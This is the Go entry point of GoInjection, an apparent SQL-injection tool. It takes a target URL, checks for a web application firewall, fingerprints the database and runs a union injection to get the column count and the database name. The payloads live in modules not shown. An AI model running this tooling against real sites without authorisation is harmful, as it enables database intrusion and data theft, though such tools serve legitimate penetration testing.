package main

import (
	"GoInjection/helper"
	"GoInjection/injections"
	injectionHelper "GoInjection/injections/helper"
	"GoInjection/modules"
	"GoInjection/structs"
	"fmt"
	"strings"
)

func main() {

	urls := []string{} // ToDo: Add File Upload

	helper.ClearScreen()
	helper.WriteLine("!", "GoInjection", true, false)
	helper.WriteLine("!", "Developed By Fourier for Axion Security", true, false)
	helper.WriteLine("!", "https://github.com/Axion-Security/GoInjection", true, false)
	helper.WriteLine(">", "URL: ", true, false)
	var input string
	fmt.Scanln(&input)
	urls = append(urls, input)

	for _, u := range urls {
		cleanedURLs, err := helper.GetUrls(u)
		if err != nil {
			fmt.Println("Error:", err)
		} else {
			for _, cleanedURL := range cleanedURLs {
				helper.ClearScreen()
				structs.TargetURL = cleanedURL
				helper.WriteLine("?", "Testing URL: "+strings.Replace(cleanedURL, helper.PayloadReplaceString, "", -1), true, false)

				helper.WriteLine("?", "Testing if target is using WAF", true, false)
				var isUsingWAF, wafDetection = modules.DetectWAF(cleanedURL)
				if isUsingWAF {
					helper.WriteLine("!", "Target is using WAF", true, false)
					helper.WriteLine("!", "WAF Detection: "+wafDetection, true, true)
					helper.WriteLine("-", "Press any Key to Continue.", true, true)
					helper.ReadKey()
					break
				} else {
					helper.WriteLine("!", "Target is not using WAF", true, true)
				}

				helper.WriteLine("?", "Checking for DBMS fingerprint...", true, false)
				structs.TargetDBMS = modules.FingerprintDB(cleanedURL, "union") // ToDo: Use Config System (viper)
				helper.WriteLine("!", "Database type detected: "+structs.TargetDBMS, true, true)

				structs.TargetSyntax = injectionHelper.Interpreter(structs.TargetDBMS)
				helper.WriteLine("?", "Determining the syntax for the injection...", true, false)
				helper.WriteLine("!", "Syntax: "+structs.TargetSyntax, true, true)

				helper.WriteLine("?", "Testing for Union Injection.", true, false)
				injections.UnionInjection(cleanedURL)
				_, structs.TargetColumns = injectionHelper.GetColumnCount(cleanedURL)
				helper.WriteLine("!", "Columns: "+fmt.Sprintf("%d", structs.TargetColumns), true, true)
				_, structs.TargetDatabaseName = injectionHelper.GetDatabase(cleanedURL, structs.TargetColumns)
				helper.WriteLine("!", "Database: "+structs.TargetDatabaseName, true, true)

				helper.WriteLine("+", "Scanning is complete.", true, false)
				helper.WriteLine("-", "Press any Key to Continue.", true, false)
				helper.ReadKey()
			}
		}
	}

	helper.WriteLine("!", "Exiting...", true, false)
}
